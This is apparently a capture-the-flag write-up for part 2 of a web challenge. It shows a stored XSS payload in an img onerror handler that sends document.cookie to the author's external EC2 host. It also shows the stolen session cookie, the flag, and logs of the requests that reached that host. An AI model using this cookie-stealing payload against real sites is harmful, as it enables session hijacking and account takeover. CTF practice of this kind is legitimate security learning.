Time to brush off those XSS skills again in a new part of the page! Same
website as before

https://wallowing-wallabies.ctfcompetition.com/

----

Using the cookie gained in part 1 opens a messages tab that is injectable.

<img src ="#" onerror
="window.location='https://ec2-54-186-29-72.us-west-2.compute.amazonaws.com/cookie?c='
+ document.cookie;" />

Gives us this cookie

green-mountains=eyJub25jZSI6Ijg4NjZlYTljYjhhZWFiNGEiLCJhbGxvd2VkIjoiXi9kZWVwLWJsdWUtc2VhL3RlYW0vY2hhcmFjdGVycy4qJCIsImV4cGlyeSI6MTQ2MjA4MzE1MH0=|1462083147|9089e3b255f8a7099673f10503113c1960519d9e

Which yields this key on.

https://wallowing-wallabies.ctfcompetition.com/deep-blue-sea/team/characters

part 2: CTF{strict_contextual_autoescaping_to_solve_your_xss_woes}


Interesting results on web request from injection. The first request is from
ours. The second is from google.

```
### OUR REQUEST
Referer:
https://wallowing-wallabies.ctfcompetition.com/deep-blue-sea/team/vendors/msg
Content-Length:
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like
Gecko) Chrome/50.0.2661.75 Safari/537.36
Connection: keep-alive
Host: ec2-54-186-29-72.us-west-2.compute.amazonaws.com
Accept: image/webp,image/*,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Content-Type:
Accept-Encoding: gzip, deflate, sdch

[IP REMOVED] - - [01/May/2016 05:47:10] "GET /logo.jpg HTTP/1.1" 200 -



### THERE REQUEST
Referer:
http://ctf-wallowing-wallabies.appspot.com/under-the-sea/application/62674
Content-Length:
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like
Gecko) Chrome/48.0.2564.97 Safari/537.36
Connection: keep-alive
Host: ec2-54-186-29-72.us-west-2.compute.amazonaws.com
Accept: image/webp,image/*,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Content-Type:
Accept-Encoding: gzip, deflate, sdch

146.148.94.130 - - [01/May/2016 05:47:11] "GET /logo.jpg HTTP/1.1" 200 -
```
